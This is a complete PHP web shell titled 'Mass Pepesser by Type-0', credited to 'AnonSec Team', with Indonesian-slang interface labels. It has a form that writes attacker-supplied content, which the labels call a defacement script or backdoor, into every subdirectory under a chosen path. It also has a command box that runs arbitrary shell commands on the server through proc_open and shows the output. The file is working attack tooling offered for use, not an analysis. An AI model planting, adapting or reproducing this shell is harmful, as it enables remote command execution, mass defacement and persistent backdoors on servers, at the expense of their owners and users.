<?php
// Type-0 Was Here
// AnonSec Team
$currentDirectory = getcwd();
$output = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['upload_submit'])) {
        $uploadDirectory = $_POST['upload_directory'] ?? '';
        $uploadName = $_POST['upload_name'] ?? '';
        $fileSource = $_POST['file_source'] ?? '';
        if (!empty($uploadDirectory) && !empty($uploadName) && !empty($fileSource)) {
            $directories = [];
            $directoryIterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($uploadDirectory, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($directoryIterator as $item) {
                if ($item->isDir()) {
                    $directories[] = $item->getPathname();
                }
            }
            $directories[] = rtrim($uploadDirectory, '/'); 
            foreach ($directories as $directory) {
                $filePath = rtrim($directory, '/') . '/' . $uploadName;
                if (file_put_contents($filePath, $fileSource) !== false) {
                    $output[] = "Suksex Mass Pepess di: $directory";
                } else {
                    $output[] = "Gagal Mass Pepess di: $directory";
                }
            }
        } else {
            $output[] = "Isi dulu semuanya tol.";
        }
    }
    if (isset($_POST['titid_submit'])) {
        $executiontitid = $_POST['egsecute'] ?? '';
        if (!empty($executiontitid)) {
            $descriptorspec = [
                0 => ['pipe', 'r'], // stdin
                1 => ['pipe', 'w'], // stdout
                2 => ['pipe', 'w']  // stderr
            ];
            $process = proc_open($executiontitid, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $titidOutput = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                $output[] = "titid output:\n$titidOutput";
            } else {
                $output[] = "Failed to execute titid.";
            }
        } else {
            $output[] = "titid nya mana.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mass Pepesser by Type-0</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            color: #007a7a;
        }
        h1 {
            background-color: #007a7a;
            color: #ffffff;
            padding: 10px;
            text-align: center;
            margin: 0;
        }
        form {
            margin: 20px auto;
            padding: 20px;
            max-width: 600px;
            background-color: #f0f8f8;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        label {
            font-weight: bold;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007a7a;
            color: #ffffff;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #005f5f;
        }
        pre {
            background-color: #f0f8f8;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
        @media (max-width: 768px) {
            form {
                padding: 15px;
            }
            button {
                width: 100%;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <h1>Mass Pepesser by Type-0</h1>
    <p style="text-align: center;"><strong>Njir:</strong> <?php echo htmlspecialchars($currentDirectory); ?></p>
    <form method="POST">
        <label for="upload_directory">Njir na:</label><br>
        <input type="text" name="upload_directory" id="upload_directory" required><br><br>
        <label for="upload_name">File name na:</label><br>
        <input type="text" name="upload_name" id="upload_name" required><br><br>
        <label for="file_source">Isi na (isi sekrip pepes atau ndak bekdur):</label><br>
        <textarea name="file_source" id="file_source" rows="10" required></textarea><br><br>
        <button type="submit" name="upload_submit">MassPepess</button>
    </form>
	<?php if (!empty($output)): ?>
        <h2 style="text-align: center;">Output:</h2>
        <pre><?php echo htmlspecialchars(implode("\n", $output)); ?></pre>
    <?php endif; ?>
    <form method="POST" style="margin-top: 20px;">
        <label for="egsecute">Commang Egsecuter:</label><br>
        <input type="text" name="egsecute" id="egsecute" required><br><br>
        <button type="submit" name="titid_submit">Execute titid</button>
    </form>
</body>
</html>
